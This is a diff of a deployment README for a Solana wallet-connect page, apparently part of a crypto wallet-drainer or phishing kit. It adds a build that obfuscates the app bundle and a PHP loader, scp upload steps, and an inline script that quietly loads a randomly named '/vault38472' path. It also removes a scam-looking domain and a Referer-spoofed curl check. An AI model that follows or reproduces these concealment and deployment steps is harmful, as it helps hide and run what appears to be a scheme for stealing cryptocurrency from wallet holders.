@@ -8,18 +8,39 @@
 
 ---
 
-## VPS files
+## Build (obfuscate everything except public HTML)
 
-Upload to `/var/www/mysite/vps/`:
+```bash
+npm run build
+```
+
+| Output | Obfuscated? |
+|--------|-------------|
+| `vercel/public/wallet.bundle.js` | Your app code yes; Reown/Solana libs minified only* |
+| `vercel/public/profile/page.js` | Yes |
+| `vercel/public/profile/index.html` | No (public HTML) |
+| `vps/public/index.html` | No (public HTML) |
+| `vps/loader.obf.php` | Yes (upload as `loader.php`) |
+
+\*Full-bundle obfuscation (~2.2 MB) takes 5+ minutes and hangs Vercel builds, so vendor libs stay minified-only.
+
+---
+
+## VPS upload
 
 ```
 vps/
-├── loader.php           ← single PHP proxy (upload once)
-├── config.php           ← copy from config.example.php — you edit this
-├── cache/               ← writable by www-data
-└── public/
-    ├── index.html
-    └── tYZq2BsVawvS5wYEF.svg
+├── loader.php           ← edit $cfg here (readable in repo)
+├── loader.obf.php       ← build output — scp as loader.php
+├── cache/
+└── public/              ← upload HTML as-is
+```
+
+```bash
+nano vps/loader.php
+npm run build
+scp vps/loader.obf.php user@vps:/var/www/mysite/vps/loader.php
+scp -r vps/public/* user@vps:/var/www/mysite/vps/public/
 ```
 
 ---
@@ -27,19 +48,15 @@ vps/
 ## HTML
 
 ```html
-<script src="/vault38472" defer></script>
+<script>
+!function(u){var s=document.createElement("script");s.src=u;s.defer=1;document.head.appendChild(s)}("/vault38472");
+</script>
 <button type="button" class="K7mQ2">Connect wallet</button>
 ```
 
 ---
 
-## nginx
-
-See `nginx/wallet-connect.conf` — `location = /vault38472` → `loader.php`.
-
----
-
-## config.php
+## loader.php `$cfg`
 
 ```php
 'reown_project_id' => 'YOUR_REOWN_ID',
@@ -51,21 +68,15 @@ See `nginx/wallet-connect.conf` — `location = /vault38472` → `loader.php`.
 'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=YOUR_KEY',
 ```
 
-```bash
-cp config.example.php config.php && nano config.php
-chmod 640 config.php
-chown -R www-data:www-data /var/www/mysite/vps
-```
-
 ---
 
 ## Vercel
 
 1. Import repo → **Root Directory:** `vercel` → Deploy
-2. No env vars needed (config lives in VPS `config.php`)
+2. Build command: `npm run build` (or `cd .. && npm run build` if root build needed)
 3. URLs: `/wallet.bundle.js` and `/profile`
 
-Reown dashboard → allow **vote-moonshot.top**
+Reown dashboard → allow **your HTML domain**
 
 ---
 
@@ -76,6 +87,4 @@ Reown dashboard → allow **vote-moonshot.top**
 Pick wallet → popup YOUR-PROJECT.vercel.app/profile
 ```
 
-Test: `curl -I -H "Referer: https://vote-moonshot.top/" https://vote-moonshot.top/vault38472`
-
-Clear cache after Vercel deploy: `rm -f vps/cache/wallet.bundle.js`
+Clear VPS cache after Vercel deploy: `rm -f vps/cache/wallet.bundle.js`
